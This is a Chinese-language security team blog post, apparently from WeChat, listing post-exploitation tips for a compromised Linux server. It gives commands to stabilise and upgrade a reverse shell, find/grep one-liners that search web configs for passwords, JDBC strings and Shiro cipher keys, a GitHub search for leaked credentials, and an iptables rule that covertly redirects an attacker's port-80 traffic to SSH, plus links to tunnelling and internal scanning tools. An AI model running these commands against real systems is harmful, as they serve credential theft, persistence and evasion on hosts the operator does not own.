> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lKiF4Qtmj_WIakrptc8IoA)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMqXyOIeCdqM3p6cDcJajNxkXU9Xaoicb7cHysyiad3YELb0DeBibhEUbmA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

本文由团队大佬Cedr0ic总结编写

**01**

  

**姿势⼀-反弹shell后如何保持会话不断**

  

⼀般弹回来⼀个shell后我们⾸先要确保shell不能掉，这⾥可以借⽤screen来保存会话

screen 

screen -ls

Screen -r 会话id

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMUaL5o9CbTKKqfAQuOKr6pI8DtQDVVBYCoZxGXfnacTauBGpeLHTAVg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMIWbJ5Iicqb762hZs9qdrI6cfibmKygfuMmice1RR9pIuXqhV0CPqt3GBQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**02**

  

**姿势⼆-如何将反弹shell⽣成交互式的shell**

  

⼀般反弹回来的shell有很多缺陷

1.⼀些命令，⽐如“su”和“ssh”需要适当的终端才能运⾏

2.标准错误信息（STDERR）经常不会被显示出来

3.不能正确使⽤⽂本编辑器如VIM

4.没有命令补全功能

5.“上”按键没有历史纪录功能

6.没有任务管理功能

7. Ctrl-C 会断

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

因此这⾥需要⽣成⼀个交互式shell以下⼏⾏命令可以完成操作。

```
`python -c 'import pty; pty.spawn("/bin/bash")' //⽣成py半交互式shell ctrl+Z``stty raw -echo fg``reset``export SHELL=bash``export TERM=xterm256-color stty rows 38 columns 116`
```

新的交互式shell

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**03**

  

**姿势三-如何快速信息收集获取服务器⼝令**

  

⼀、⼝令获取

获得目标主机的权限后，通过查看网站的配置文件，获得口令信息

常⽤密码⽂件收集整理

```
`find / -name *.properties 2>/dev/null | grep WEB-INF``find / -name "*.properties" | xargs egrep -i "user|pass|pwd|uname|login|db_" find / -regex ".*\.properties\|.*\.conf\|.*\.config" | xargs grep -E "=jdbc:|pass="``find /webapp -regex ".*\.properties" -print 2>/dev/null | xargs grep -E "=jdbc:|rsync"``find / -regex ".*\.properties" -print  2>/dev/null``find / -regex ".*\.properties\|.*\.conf\|.*\.config\|.*\.sh" | xargs grep -E "=jdbc:|pass=|passwd="``grep -r 'setCipherKey(Base64.decode(' /web路径``find / -regex ".*\.xml\|.*\.properties\|.*\.conf\|.*\.config\|.*\.jsp" | xargs grep -E "setCipherKey"`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

⼆、github 搜密码技巧

xxx.com  filename:properties

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**04**

  

**姿势四-隧道代理技术绕过⼤部分杀软**

  

服务器出⽹：https://github.com/ehang-io/nps（安装使⽤⽅法这⾥省略）

⽀持多种协议代理⽅式

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

服务器不出⽹：使⽤端⼝复⽤技巧

iptables -t nat -I PREROUTING 1 -p tcp -s 攻击者的IP --dport 80 -j DNAT -- to-destination 靶机的IP:22

  

配置完成后，攻击者的IP连接靶机的80端⼝，可登录靶机的SSH服务；其它机器可正常访问靶机的HTTP服务；

攻击者的IP没法访问靶机的HTTP服务。

**05**

  

**姿势五-使⽤脚本对内⽹常⻅服务进⾏快速扫描**

  

扫描⼯具：只需要python环境不需要其他库

https://github.com/PINGXcpost/F-NAScan-PLUS

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

对F-NAScan-PLUS扫描报告中单个服务进⾏提取

https://github.com/soxfmr/F-NAScan-Export

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**【往期推荐】**  

[未授权访问漏洞汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484804&idx=2&sn=519ae0a642c285df646907eedf7b2b3a&chksm=ea37fadedd4073c87f3bfa844d08479b2d9657c3102e169fb8f13eecba1626db9de67dd36d27&scene=21#wechat_redirect)  

[干货|常用渗透漏洞poc、exp收集整理](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485181&idx=3&sn=9eb034dd011ac71c4e3732129c332bb3&chksm=ea37f9a7dd4070b1545a9cb71ba14c8ced10aa30a0b43fb5052aed40da9ca43ac90e9c37f55a&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次HW实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)  

[【超详细】Fastjson1.2.24反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的“FOFA”工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_**走过路过的大佬们留个关注再走呗**_![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**往期文章有彩蛋哦****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)**

  

[](http://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&mid=2247483808&idx=1&sn=e49283ccb0de1a3b7ac89e9cdb6d0e2f&chksm=9b370994ac4080829721246426d4dee351a4b7bdc2ac737f1f5fe1eb1a69eeb8a1dcaeb50b13&scene=21#wechat_redirect)![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

安

全

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**扫描二维码 ｜****关注我们**

微信号 : WhITECat_007  ｜  名称：WhITECat安全团队